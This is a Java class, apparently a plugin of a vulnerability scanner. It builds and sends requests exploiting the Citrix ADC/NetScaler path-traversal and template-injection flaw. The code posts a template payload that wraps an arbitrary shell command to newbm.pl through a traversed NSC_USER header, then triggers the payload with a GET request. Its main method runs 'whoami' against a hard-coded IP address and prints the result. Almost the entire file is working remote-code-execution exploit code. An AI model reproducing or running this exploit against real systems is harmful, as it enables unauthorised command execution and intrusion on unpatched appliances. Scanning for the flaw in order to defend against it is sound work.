package com.gbw.scanner.plugins.scripts.web.citrix;

import com.gbw.scanner.utils.RandomUtils;
import com.gbw.scanner.utils.SSLUtils;
import org.apache.http.HttpEntity;

import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;


public class GBWScanCitrixRequestBuilder {

    private static final String UA = "bing bot";

    public static HttpPost makePocRequest(String proto,String host, int port, String randomXML, String cmd, boolean isEncode) throws UnsupportedEncodingException {

        if(isEncode)
            cmd = URLEncoder.encode(cmd, Charset.forName("UTF-8"));

        String uri;
        if(port == 80||port ==443)
            uri = String.format("%s://%s/vpn/../vpns/portal/scripts/newbm.pl",proto,host);
        else
            uri = String.format("%s://%s:%d/vpn/../vpns/portal/scripts/newbm.pl",proto,host,port);

        String payload = "url=http://exemple.com&" +
                "title=[%t=template.new({'BLOCK'='print `" +cmd+
                "`'})%][% t %]&" +
                "desc=test&" +
                "UI_inuse=RfWeb";

        HttpPost post = new HttpPost(uri);

        post.addHeader("User-Agent",UA);
        post.addHeader("NSC_USER", "../../../../netscaler/portal/templates/"+randomXML);
        post.addHeader("NSC_NONCE","c");
        post.addHeader("Content-Type","application/x-www-form-urlencoded");
        StringEntity body = new StringEntity(payload);
        post.setEntity(body);

        return post;
    }

    public static HttpGet makeTrigRequest(String proto, String host, int port, String randomXML){

        String uri;
        if(port == 80||port == 443)
            uri = String.format("%s://%s/vpns/portal/%s.xml",proto,host,randomXML);
        else
            uri = String.format("%s://%s:%d/vpns/portal/%s.xml",proto,host,port,randomXML);

        HttpGet httpGet = new HttpGet(uri);
        httpGet.addHeader("User-Agent",UA);
        httpGet.addHeader("NSC_USER","../../../../netscaler/portal/templates/"+randomXML);
        httpGet.addHeader("NSC_NONCE","c");

        return httpGet;
    }

    public static void main(String[] args) throws IOException, InterruptedException, KeyManagementException, NoSuchAlgorithmException, KeyStoreException {

        String host = "89.1.83.231";
        int port = 80;
        String r = RandomUtils.makeRandomText(12);
        String cmd = "whoami";
        HttpPost pocRequest = makePocRequest("https",host,port,r,cmd,false);


        CloseableHttpClient httpClient = SSLUtils.createClient();


        CloseableHttpResponse response = (CloseableHttpResponse) httpClient.execute(pocRequest);

        response.close();

       HttpGet httpGet = makeTrigRequest("https",host,port,r);
       response = (CloseableHttpResponse)httpClient.execute(httpGet);

        HttpEntity body = response.getEntity();

        System.out.println(EntityUtils.toString(body));

        EntityUtils.consume(body);
        response.close();
        httpClient.close();

    }
}
